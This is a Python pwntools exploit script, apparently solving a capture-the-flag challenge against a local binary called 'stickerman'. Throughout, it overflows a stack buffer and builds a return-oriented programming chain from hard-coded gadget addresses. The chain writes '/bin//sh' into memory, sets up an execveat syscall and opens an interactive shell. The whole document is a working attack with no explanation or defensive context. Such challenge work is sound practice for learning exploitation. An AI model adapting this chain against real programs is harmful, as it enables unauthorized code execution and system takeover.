from pwn import *

r = process('./stickerman')
p = b'a'*72
gdb.attach(r)
p += p64(0x00000000004015ec) # pop rsi ; ret
p += p64(0x00000000006d60e0) # @ .data
p += p64(0x00000000004005af) # pop rax ; ret
p += b'/bin//sh'
p += p64(0x000000000048e4d1) # mov qword ptr [rsi], rax ; ret
p += p64(0x00000000004015ec) # pop rsi ; ret 
p += p64(0x00000000006d60e8) # @ .data + 8
p += p64(0x0000000000453260) # xor rax, rax ; ret
p += p64(0x000000000048e4d1) # mov qword ptr [rsi], rax ; ret

p += p64(0x00000000004006a6) # pop rdi ; ret
p += p64(0)
p += p64(0x00000000004015ec) # pop rsi ; ret
p += p64(0x00000000006d60e0) # @ .data
p += p64(0x0000000000457f25) # pop rdx ; ret
p += p64(0x00000000006d60e8) # @ .data + 8
p += p64(0x000000000045a585) # pop r10 ; ret
p += p64(0x00000000006d60e8) # @ .data + 8


p += p64(0x0000000000453260) # xor rax, rax ; ret
for i in range(322):
        p += p64(0x0000000000483800) # add rax, 1 ; ret
p += p64(0x000000000040ffcc) # syscall 
r.sendline(p)
r.interactive()
